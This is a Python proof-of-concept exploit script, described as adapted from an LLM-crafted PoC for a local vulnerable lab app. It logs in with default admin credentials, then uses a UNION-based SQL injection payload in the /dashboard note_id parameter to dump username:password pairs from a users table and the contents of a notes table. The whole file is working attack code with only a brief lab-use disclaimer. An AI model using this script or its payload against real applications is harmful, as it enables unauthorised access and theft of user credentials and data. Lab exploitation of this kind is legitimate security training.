#!/usr/bin/env python3
"""Verified PoC — authenticated UNION SQLi on the vuln-lab /dashboard endpoint.

Adapted from the LLM-crafted PoC to match the app's actual shape (GET params,
<li> output). Logs in, then dumps users.username:password via UNION injection.
Authorized lab use only.
"""
import re, urllib.parse, urllib.request

BASE = "http://127.0.0.1:8081"

def login():
    with urllib.request.urlopen(f"{BASE}/login?u=admin&p=admin") as r:
        return r.headers.get("Set-Cookie", "").split(";")[0]  # session=...

def dump(cookie, table, cols):
    payload = f"0 UNION SELECT {cols} FROM {table}-- -"
    url = f"{BASE}/dashboard?note_id=" + urllib.parse.quote(payload)
    req = urllib.request.Request(url, headers={"Cookie": cookie})
    with urllib.request.urlopen(req) as r:
        return re.findall(r"<li>(.*?): (.*?)</li>", r.read().decode())

def main():
    cookie = login()
    print("session:", cookie)
    print("users (username:password):")
    for a, b in dump(cookie, "users", "username,password"):
        print(f"  {a}:{b}")
    print("notes:")
    for a, b in dump(cookie, "notes", "owner,body"):
        print(f"  {a} -> {b}")

if __name__ == "__main__":
    main()
